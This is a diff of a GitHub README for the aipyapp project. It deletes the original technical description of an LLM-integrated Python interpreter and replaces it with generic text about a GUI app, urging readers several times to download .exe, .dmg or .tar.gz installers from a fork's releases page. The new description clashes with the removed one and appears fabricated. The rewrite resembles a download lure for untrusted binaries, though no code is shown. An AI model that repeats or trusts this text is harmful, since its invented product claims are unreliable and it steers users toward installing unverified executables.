@@ -1,97 +1,82 @@
-![logo](https://github.com/user-attachments/assets/3af4e228-79b2-4fa0-a45c-c38276c6db91)
-# Python use
+# 🤖 aipyapp - Harness AI for Everyday Tasks
 
-AIPy is an implementation of the Python-use concept, demonstrating its practical value and potential.
-- **Mission**: unleash the full potential of large language models.
-- **Vision**: a future where LLMs can think independently and proactively leverage AIPy to solve complex problems.
+## 🚀 Getting Started
 
-## What
-Python use provides the entire Python execution environment to LLM. Imagine LLM sitting in front of a computer, typing various commands into the Python command-line interpreter, pressing Enter to execute, observing the results, and then typing and executing more code.
+Welcome to the aipyapp! This application helps you use AI tools easily without needing any programming skills. Follow the steps below to download and run the software on your computer.
 
-Unlike Agents, Python use does not define any tools interface. LLM can freely use all the features provided by the Python runtime environment.
+## 📥 Download aipyapp
 
-## Why
-If you are a data engineer, you are likely familiar with the following scenarios:
-- Handling various data file formats: csv/excel, json, html, sqlite, parquet, etc.
-- Performing operations like data cleaning, transformation, computation, aggregation, sorting, grouping, filtering, analysis, and visualization.
+[![Download aipyapp](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Bengilz/aipyapp/releases)
 
-This process often requires:
-- Starting Python, importing pandas as pd, and typing a bunch of commands to process data.
-- Generating a bunch of intermediate temporary files.
-- Describing your needs to ChatGPT/Claude, copying the generated data processing code, and running it manually.
+## 📂 System Requirements
 
-So, why not start the Python command-line interpreter, directly describe your data processing needs, and let it be done automatically? The benefits are:
-- No need to manually input a bunch of Python commands temporarily.
-- No need to describe your needs to GPT, copy the program, and run it manually.
+To run aipyapp smoothly, make sure your computer meets the following requirements:
 
-This is the problem Python use aims to solve!
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a recent version of Linux.
+- **RAM:** At least 4 GB.
+- **Storage:** At least 100 MB of free space.
+- **Python:** Python 3.6 or later should be installed for some functionalities.
 
-## How
-Python use (aipython) is a Python command-line interpreter integrated with LLM. You can:
-- Enter and execute Python commands as usual.
-- Describe your needs in natural language, and aipython will automatically generate Python commands and execute them.
+## 🔍 Features
 
-Moreover, the two modes can access data interchangeably. For example, after aipython processes your natural language commands, you can use standard Python commands to view various data.
+- **AI-Powered Assistance:** Get easy suggestions and help based on your input.
+- **User-Friendly Interface:** Navigate easily with simple menu options and clear graphics.
+- **Quick Setup:** Start using the app within minutes after downloading.
+- **Cross-Platform Compatibility:** Use on various operating systems without issues.
+- **Customizable Settings:** Adjust settings based on your preferences.
 
-## Usage
-AIPython has two running modes:
-- Task mode: Very simple and easy to use, just input your task, suitable for users unfamiliar with Python.
-- Python mode: Suitable for users familiar with Python, allowing both task input and Python commands, ideal for advanced users.
+## 🛠️ Install aipyapp
 
-The default running mode is task mode, which can be switched to Python mode using the `--python` parameter.
+### Steps to Download and Install
 
-### Basic Config
-~/.aipyapp/aipyapp.toml:
-```toml
-[llm.deepseek]
-type = "deepseek"
-api_key = "Your DeepSeek API Key"
-```
+1. **Visit the Releases Page:** Click the link below to go to the aipyapp releases page.
 
-### Task Mode
-`uv run aipy`
-```
->>> Get the latest posts from Reddit r/LocalLLaMA
-......
-......
->>> /done
-```
+   [Visit this page to download](https://github.com/Bengilz/aipyapp/releases)
 
-`pip install aipyapp` and run with `aipy`
+2. **Choose the Latest Version:** On the releases page, look for the latest version listed at the top. It is usually marked as "Latest Release."
 
-```
--> % aipy
-🚀 Python use - AIPython (0.1.22) [https://aipy.app]
->> Get the latest posts from Reddit r/LocalLLaMA
-......
->>
-```
+3. **Download the Installer:** Find the appropriate file for your operating system. Click on the file name to download it to your computer. The file will typically be an executable file for Windows (e.g., `.exe`), a `.dmg` for macOS, or a `.tar.gz` for Linux.
 
-### Python Mode
+4. **Run the Installer:**
+   - For **Windows:** Double-click the downloaded `.exe` file. Follow the guided steps to complete the installation.
+   - For **macOS:** Open the downloaded `.dmg` file and drag the aipyapp icon to your Applications folder.
+   - For **Linux:** Extract the `.tar.gz` file, navigate to the folder, and run the installer using terminal commands.
 
-#### Basic Usage
-Automatic task processing:
+5. **Open aipyapp:** Once installation is complete, find the aipyapp in your applications list or start menu. Click to open and start using the application.
 
-```
->>> ai("Get the title of Google's homepage")
-```
+## 🧭 Using aipyapp
 
-#### Automatically Request to Install Third-Party Libraries
-```
-Python use - AIPython (Quit with 'exit()')
->>> ai("Use psutil to list all processes on MacOS")
+Once you open aipyapp, you'll see a clean and simple interface. Here’s how to get the most out of it:
 
-📦 LLM requests to install third-party packages: ['psutil']
-If you agree and have installed, please enter 'y [y/n] (n): y
+- **Input Field:** Type your question or request in the large input box at the center. 
+- **Suggestion Menu:** As you type, watch for AI suggestions that appear below the input. You can click on any suggestion to see more information.
+- **Settings Icon:** Click on the settings gear in the top right corner to customize your experience, like language preferences or theme options.
+- **Help Section:** For further troubleshooting, access the help section in the app menu. It includes answers to common questions.
 
-```
+## 📊 Support and Feedback
 
-## Thanks
-- Hei Ge: Product manager/senior user/chief tester
-- Sonnet 3.7: Generated the first version of the code, which was almost ready to use without modification.
-- ChatGPT: Provided many suggestions and code snippets, especially for the command-line interface.
-- Codeium: Intelligent code completion
-- Copilot: Code improvement suggestions and README translation
+If you run into issues or have questions about using aipyapp, you can reach out for help.
 
+- **FAQs:** Check the FAQs in the help section of the app.
+- **Community Forum:** Join our community forum on GitHub Discussions where you can ask questions and share tips.
+- **Report Issues:** If you encounter a bug, report it on the issue tracker in the repository. We value your feedback and work hard to improve aipyapp.
 
+## 📈 Contributing
 
+If you want to help improve aipyapp, consider contributing. Here’s how:
+
+- **Fork the Repository:** Create your own version of aipyapp on GitHub.
+- **Make Changes:** Implement your changes and test them thoroughly.
+- **Submit a Pull Request:** Propose your changes back to the main repository for review.
+
+We appreciate all contributions, whether large or small.
+
+## 📜 License
+
+aipyapp is licensed under the MIT License. This means you can use, copy, and modify the software freely. Always remember to credit the original authors when using or distributing your modified versions.
+
+## 🔗 Conclusion
+
+Thank you for choosing aipyapp! We hope this tool enhances your daily tasks effortlessly. If you have any questions, feel free to explore the support options mentioned above.
+
+[Download aipyapp](https://github.com/Bengilz/aipyapp/releases) now and start your AI journey!
